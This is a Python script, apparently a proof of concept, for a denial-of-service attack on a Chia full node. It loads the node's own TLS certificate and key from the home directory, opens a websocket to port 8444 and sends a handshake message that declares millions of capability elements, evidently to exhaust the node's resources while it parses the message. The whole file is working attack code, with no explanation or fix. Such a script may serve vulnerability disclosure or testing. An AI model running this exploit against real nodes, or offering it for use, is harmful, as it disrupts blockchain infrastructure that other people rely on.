import asyncio
import ssl
import sys
import os
from pathlib import Path
import aiohttp

def make_handshake_payload(num_elements):
    payload = b""
    payload += (7).to_bytes(4, "big") + b"mainnet"
    payload += (6).to_bytes(4, "big") + b"0.0.36"
    payload += (5).to_bytes(4, "big") + b"1.8.0"
    payload += (8444).to_bytes(2, "big")
    payload += (1).to_bytes(1, "big")
    payload += (num_elements).to_bytes(4, "big")
    element = (1).to_bytes(2, "big") + (0).to_bytes(4, "big")
    payload += element * min(num_elements, 100000)
    return payload

def make_message(msg_type, msg_id, data):
    msg = b""
    msg += msg_type.to_bytes(1, "big")
    if msg_id is None:
        msg += b"\x00"
    else:
        msg += b"\x01" + msg_id.to_bytes(2, "big")
    msg += len(data).to_bytes(4, "big")
    msg += data
    return msg

async def send_dos(host, port, cert_path, key_path, ca_path, num_elements):
    ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=ca_path)
    ssl_context.load_cert_chain(certfile=cert_path, keyfile=key_path)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_REQUIRED
    url = f"wss://{host}:{port}/ws"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.ws_connect(url, ssl=ssl_context) as ws:
                handshake_data = make_handshake_payload(num_elements)
                msg = make_message(1, 0, handshake_data)
                await ws.send_bytes(msg)
                await asyncio.sleep(5)
    except Exception as e:
        print(f"Connection status: {e}")

if __name__ == "__main__":
    host = "127.0.0.1"
    port = 8444
    home = str(Path.home())
    cert_path = f"{home}/.chia/mainnet/config/ssl/full_node/private_full_node.crt"
    key_path = f"{home}/.chia/mainnet/config/ssl/full_node/private_full_node.key"
    ca_path = f"{home}/.chia/mainnet/config/ssl/ca/chia_ca.crt"
    num_elements = int(sys.argv[1]) if len(sys.argv) > 1 else 5000000
    asyncio.run(send_dos(host, port, cert_path, key_path, ca_path, num_elements))
